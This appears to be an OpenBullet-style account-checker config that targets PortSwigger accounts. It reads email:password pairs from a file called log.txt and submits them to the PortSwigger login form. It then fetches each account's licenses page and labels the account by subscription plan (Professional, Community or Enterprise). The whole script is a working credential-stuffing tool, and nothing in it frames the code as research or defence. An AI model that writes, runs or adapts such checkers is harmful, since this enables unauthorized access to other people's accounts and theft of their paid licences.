## PortSwigger Subscription Extraction
## Reads accounts from log.txt and extracts subscription information
## Uses Translate block for proper variable substitution in form data

FileReadLines "log.txt" -> VAR "accounts"
PRINT "Loaded accounts" White

## Extract first account
SET VAR "account" $"<accounts[0]>"

## Split by colon - creates creds_0, creds_1, etc.
Split $"<account>" ":" -> VAR "creds"
SET VAR "email" $"<creds_0>"
SET VAR "password" $"<creds_1>"

PRINT "Account: <email>" White

## Step 1: GET login page
HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
SET VAR "loginPageRes" $"<SOURCE>"
PRINT "✓ Login page fetched" White

## Step 2: Build form data with proper variable substitution using Translate
Translate "username=EMAIL_PLACEHOLDER&password=PASSWORD_PLACEHOLDER&action=default"
  KEY "EMAIL_PLACEHOLDER" VALUE $"<email>"
  KEY "PASSWORD_PLACEHOLDER" VALUE $"<password>"
  -> VAR "formData"

## POST login credentials with properly substituted form data
HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
  CONTENT $"<formData>"
  CONTENTTYPE "application/x-www-form-urlencoded"
SET VAR "loginRes" $"<SOURCE>"
PRINT "✓ Credentials posted" White

## Step 3: GET licenses page
HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
SET VAR "licensesRes" $"<SOURCE>"
PRINT "✓ Licenses page fetched" White

## Check for subscription
SET VAR "plan" "free"

IF $"<licensesRes>" Contains "Professional"
  SET VAR "plan" "Professional"
ELSE
  IF $"<licensesRes>" Contains "Community"
    SET VAR "plan" "Community"
  ELSE
    IF $"<licensesRes>" Contains "Enterprise"
      SET VAR "plan" "Enterprise"
    ENDIF
  ENDIF
ENDIF

## Output result
PRINT "Result: <email> - <plan>" Green
